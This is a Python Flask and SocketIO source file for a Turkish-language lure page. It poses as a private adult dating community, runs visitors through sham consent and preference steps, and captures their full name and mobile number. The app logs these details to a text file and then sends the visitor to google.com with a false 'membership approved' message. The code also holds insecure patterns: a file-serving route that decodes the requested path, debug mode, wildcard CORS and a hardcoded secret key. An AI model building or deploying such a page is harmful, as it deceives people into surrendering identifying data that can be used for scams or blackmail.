from flask import Flask, render_template_string, send_from_directory
from flask_socketio import SocketIO, emit
import datetime
import os
import urllib.parse

app = Flask(__name__)
app.config['SECRET_KEY'] = 'modern_v12_premium'
socketio = SocketIO(app, cors_allowed_origins="*")

@app.route('/files/<path:filename>')
def custom_static(filename):
    safe_filename = urllib.parse.unquote(filename)
    return send_from_directory(os.getcwd(), safe_filename)

USER_PAGE = '''
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>%100 Özel Ve Gizli Konuşmalar</title>
    <style>
        :root { --primary-color: #ff0033; --bg-dark: #0a0a0a; }
        
        body { 
            margin: 0; padding: 0; font-family: 'Inter', 'Segoe UI', sans-serif;
            background: var(--bg-dark); min-height: 100vh; 
            display: flex; justify-content: center; align-items: center; color: white;
            overflow: hidden;
        }

        /* Dinamik Arka Plan */
        #bg-video {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            object-fit: cover; z-index: -1; transition: opacity 1s ease;
        }
        
        /* Görseli Canlı Kılan Katman */
        .overlay { 
            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
            background: radial-gradient(circle, rgba(0,0,0,0.4) 0%, rgba(10,10,10,0.9) 100%);
            z-index: 0;
        }

        .main-container { position: relative; z-index: 2; width: 90%; max-width: 420px; }

        /* Modern Cam Kart Tasarımı */
        .card { 
            background: rgba(20, 20, 20, 0.75); 
            backdrop-filter: blur(15px); 
            -webkit-backdrop-filter: blur(15px);
            padding: 40px 30px; border-radius: 24px; 
            border: 1px solid rgba(255, 255, 255, 0.1); 
            display: none; 
            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
        }
        .active { display: block; animation: slideUp 0.5s cubic-bezier(0.2, 0.8, 0.2, 1); }

        @keyframes slideUp { 
            from { opacity: 0; transform: translateY(30px); } 
            to { opacity: 1; transform: translateY(0); } 
        }
        
        h1 { font-size: 24px; font-weight: 800; letter-spacing: -0.5px; margin-bottom: 10px; color: #fff; }
        p { color: rgba(255,255,255,0.7); font-size: 15px; margin-bottom: 30px; line-height: 1.6; }

        /* Modern Seçim Alanları */
        .selection-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 20px; }
        .choice-item { 
            cursor: pointer; transition: all 0.3s ease; text-align: center;
            background: rgba(255,255,255,0.05); border-radius: 16px; padding: 10px;
            border: 1px solid transparent;
        }
        .choice-item img { width: 100%; height: 120px; object-fit: cover; border-radius: 12px; margin-bottom: 8px; }
        .choice-item p { margin: 0; font-size: 12px; font-weight: 600; color: #fff; }
        .choice-item:hover { background: rgba(255,0,51,0.1); border-color: var(--primary-color); transform: translateY(-5px); }

        /* Modern Inputlar */
        input { 
            width: 100%; padding: 16px; margin-bottom: 15px; 
            background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); 
            color: #fff; border-radius: 12px; box-sizing: border-box; font-size: 16px;
            transition: all 0.3s;
        }
        input:focus { outline: none; border-color: var(--primary-color); background: rgba(255,255,255,0.15); box-shadow: 0 0 15px rgba(255,0,51,0.2); }

        /* Premium Butonlar */
        .btn { 
            width: 100%; padding: 18px; border: none; border-radius: 12px; 
            font-weight: 700; cursor: pointer; text-transform: uppercase; 
            font-size: 13px; letter-spacing: 1px; transition: all 0.3s;
        }
        .btn-red { background: var(--primary-color); color: white; box-shadow: 0 8px 20px rgba(255,0,51,0.3); }
        .btn-red:hover { transform: translateY(-2px); box-shadow: 0 12px 25px rgba(255,0,51,0.5); background: #ff1a47; }
        
        .btn-outline { background: transparent; border: 1px solid rgba(255,255,255,0.2); color: white; margin-top: 10px; }
        .btn-outline:hover { background: rgba(255,255,255,0.1); }

        .char-img { width: 100%; border-radius: 16px; margin-bottom: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        .success-text { color: var(--primary-color); font-weight: 700; font-size: 14px; margin-bottom: 10px; display: block; }
    </style>
</head>
<body id="main-body">
    <div class="overlay"></div>
    <div class="main-container">

        <div id="step-0" class="card active">
            <h1>%100 Özel Ve Gizli Konuşmalar</h1>
            <p>Gizlilik odaklı topluluğumuza katılmak için şartları onaylayın kimseyi ifşalamayın kimsenin bilgierini kayıt altına almayın.</p>
            <img src="/files/karakter.gif" class="char-img">
            <button class="btn btn-red" onclick="move(1)">ONAYLIYORUM</button>
        </div>

        <div id="step-1" class="card">
            <span class="success-text">ADIM 1 / 3</span>
            <h1>İLK ADIM</h1>
            <p>Buradaki üyelerimiz oldukça girişken. Senin için bu durum bir sorun teşkil eder mi?</p>
            <button class="btn btn-red" onclick="move(2)">HAYIR, SORUN OLMAZ</button>
            <button class="btn btn-outline" onclick="move(2)">EVET, EDER</button>
        </div>

        <div id="step-2" class="card">
            <span class="success-text">ADIM 2 / 3</span>
            <h1>GİZLİLİK SÖZÜ</h1>
            <p>Buluşmaların tamamen anonim kalacağını ve kimseyi ifşa etmeyeceğinizi kabul ediyor musunuz?</p>
            <button class="btn btn-red" onclick="move(3)">KABUL EDİYORUM</button>
            <button class="btn btn-outline" onclick="move(3)">HAYIR</button>
        </div>

        <div id="step-3" class="card">
            <span class="success-text">ADIM 3 / 3</span>
            <h1>SON KONTROL</h1>
            <p>Gerçek profillerle eşleşeceksiniz. Karşınızdaki kişiye saygılı davranacak mısınız?</p>
            <button class="btn btn-red" onclick="move('choices')">EVET, SÖZ VERİYORUM</button>
        </div>

        <div id="step-choices" class="card">
            <h1>TERCİHİNİZ?</h1>
            <p>Sizin için en ideal vücut tipini seçin.</p>
            <div class="selection-grid">
                <div class="choice-item" onclick="move('age')"><img src="/files/2.jpg"><p>Zayıf</p></div>
                <div class="choice-item" onclick="move('age')"><img src="/files/3.jpg"><p>Normal</p></div>
                <div class="choice-item" onclick="move('age')"><img src="/files/1.jpg"><p>Balık Etli</p></div>
                <div class="choice-item" onclick="move('age')"><img src="/files/5.jpg"><p>Fit & Kıvrımlı</p></div>
            </div>
        </div>

        <div id="step-age" class="card">
            <h1>YAŞ ARALIĞI</h1>
            <p>Size uygun profillerin yaş aralığını belirleyin.</p>
            <div class="selection-grid">
                <div class="choice-item" onclick="move('final')"><img src="/files/18.jpg"><p>18 - 25</p></div>
                <div class="choice-item" onclick="move('final')"><img src="/files/25.jpg"><p>25 - 40</p></div>
                <div class="choice-item" onclick="move('final')"><img src="/files/40.jpg"><p>40 - 55</p></div>
                <div class="choice-item" onclick="move('final')"><img src="/files/60.jpg"><p>55 - 70</p></div>
            </div>
        </div>

        <div id="step-final" class="card">
            <span class="success-text">SON ADIM</span>
            <h1>KAYDINIZI TAMAMLAYIN</h1>
            <p>Cevaplarınız için teşekkürler. Çılgınca fantezilerinizi gerçekleştirmek için hazırsanız formu doldurup topluluğa katılın.</p>
            <input type="text" id="isim" placeholder="Adınız ve Soyadınız">
            <input type="tel" id="numara" placeholder="05XX XXX XX XX" maxlength="11">
            <button class="btn btn-red" onclick="finish()">KAYDI TAMAMLA & BAŞLA</button>
        </div>

    </div>

    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
    <script>
        const socket = io();
        
        function move(step) {
            const body = document.getElementById('main-body');
            
            // Arka plan geçiş efekti
            if(step === 'final') {
                body.style.background = "url('/files/kadin.gif') no-repeat center center fixed";
                body.style.backgroundSize = "cover";
            } else {
                body.style.background = "url('/files/arkaplan.jpg') no-repeat center center fixed";
                body.style.backgroundSize = "cover";
            }

            document.querySelectorAll('.card').forEach(c => c.classList.remove('active'));
            document.getElementById('step-' + step).classList.add('active');
        }

        function finish() {
            const isim = document.getElementById('isim').value;
            const numara = document.getElementById('numara').value;
            const checkNum = /^05[0-9]{9}$/;
            if (!isim || isim.length < 3) { alert("Lütfen geçerli bir isim giriniz."); return; }
            if (!checkNum.test(numara)) { alert("Geçersiz telefon numarası! 05 ile başlamalıdır."); return; }
            socket.emit('yeni_kayit', { isim, numara });
            alert("Harika! Üyeliğiniz onaylandı. Yönlendiriliyorsunuz...");
            window.location.href = "https://www.google.com";
        }
    </script>
</body>
</html>
'''

@app.route('/')
def index(): return render_template_string(USER_PAGE)

@socketio.on('yeni_kayit')
def handle_kayit(data):
    zaman = datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")
    with open("kayitlar.txt", "a", encoding="utf-8") as f:
        f.write(f"Zaman: {zaman} | İsim: {data['isim']} | Tel: {data['numara']}\\n")

if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=80, debug=True)